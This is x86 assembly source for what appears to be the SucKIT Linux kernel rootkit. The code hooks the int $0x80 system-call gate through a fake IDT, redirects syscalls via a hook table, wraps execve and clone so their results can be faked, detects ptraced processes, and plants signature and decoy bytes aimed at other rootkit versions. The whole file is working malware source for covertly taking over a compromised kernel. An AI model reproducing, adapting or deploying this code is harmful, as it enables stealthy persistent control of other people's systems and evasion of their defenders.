/*
 * $Id: _entry.S, atomic low-level kernel routines; syscall handling,
 *	int $0x80 entrypoint etc.
 */

#include "kernel.h"
#include "idt.h"
#include "syscall.h"
#include "segment.h"
.align	0
.p2align 0

#define	OFF	2048-16

.globl	new_clone
.globl	kernel_start
.globl	kernel_end
.globl	kernel_idt
.globl	refresh_idt
.globl	kcount
.globl	kernel_thread
.globl	sc
kernel_start:

/* there is start of memory alloced in kspace */
kernel_idt:	.zero	2048	/* for IDT entries, including our fake 0x80 */

/*
 * execute a kernel thread
 * int kernel_thread(int (*fn)(void *), ulong arg1, ulong arg2);
 */
kernel_thread:
	push	%ebx
	push	%ecx
	mov	8+4(%esp), %ebx	/* fn */
	mov	8+8(%esp), %ecx	/* arg1 */
	mov	8+12(%esp), %edx /* arg2 */
	mov	$__NR_fork, %eax
	int	$0x80
	test	%eax, %eax
	jnz	kt_parent
	push	%edx
	push	%ecx
	call	*%ebx
	mov	$__NR_exit, %eax
	int	$0x80
kt_parent:
	pop	%ecx
	pop	%ebx
	ret


/*
 * this will perform direct system call
 * it will add $4, %esp after execution (handled in makefile) !
 */
__do_syscall:
	pop	%eax		/* ret addr */
	xchg	(%esp), %eax	/* syscall nr to eax */
	shl	$2, %eax
	add	kernel_sct, %eax
	jmp	*(%eax)


new_execve:
	pop	%esi		/* return address to esi */
	push	%eax
	call	execve_head
	test	%eax, %eax
	js	fake_error
	pop	%eax
	mov	kernel_sct, %edi
	call	*(__NR_execve*4)(%edi)
	push	%eax
	call	execve_tail
	pop	%eax
	jmp	*%esi
fake_error:
	add	$4, %esp
	jmp	*%esi

/* in assembly; for better performance */
new_clone:
	pop	%esi
	mov	kernel_sct, %edi
	call	*(%edi, %eax, 4)
	push	%eax
	call	fork_pid
	pop	%eax
	jmp	*%esi

/* this is our hooked int $0x80 */
_int80_hook:
	test	$0xffffff00, %eax
	jnz	exec_old80
	cs
	cmp	$0, kernel_hook_table(,%eax,4)
	jnz	hooked_sys
exec_old80:
	cs
	jmp	*kernel_old80

/* emulate system_call prologue */
hooked_sys:
	push	%eax
	cld
	push	%es
	push	%ds

	push	%eax
	push	%ebp
	push	%edi
	push	%esi
	push	%edx
	push	%ecx
	push	%ebx

	movl	$KERNEL_DS, %edx
	movl	%edx, %ds
	movl	%edx, %es

	/* decide whether pid is currently traced or not */
	movl	$-8192, %ebx
	and	%esp, %ebx
	mov	pt_off, %edx
	movb	(%ebx,%edx), %dl
	testb	pt_bit, %dl
	jne	traced_call
	call	*kernel_hook_table(,%eax,4)
	pushl	sc_ret
	cmp	$FALLTHRU, %eax
	je	fallthru
_ret:	ret

traced_call:
	movl	$-38, 0x18(%esp)
	call	*s_trace
	movl	0x24(%esp), %eax
	call	*kernel_hook_table(,%eax,4)
	pushl	pt_ret
	cmp	$FALLTHRU, %eax
	jne	_ret
fallthru:
	mov	kernel_sct, %edx
	movl	0x28(%esp), %eax
	jmp	*(%edx, %eax, 4)

.ascii	"PUNK"
int80_hook:
	jmp	_int80_hook
	/* just a fool for older suckit versions */
	.ascii	"\xff\x14\x85"
	.long	0

/* include compiled .c source */
#define __KERNEL__
#include "sha1.S"
#include "_kernel.S"

sc:
s_trace:.long	0	/* where is syscall_trace() */
sc_ret:	.long	0	/* right after call sys_call_table(%eax,4) */
pt_ret:	.long	0	/* same, but when ptraced */
pt_off:	.long	0	/* offset to search ptrace bit in task struct */
pt_bit:	.byte	0	/* which ptrace bit */

kernel_end:
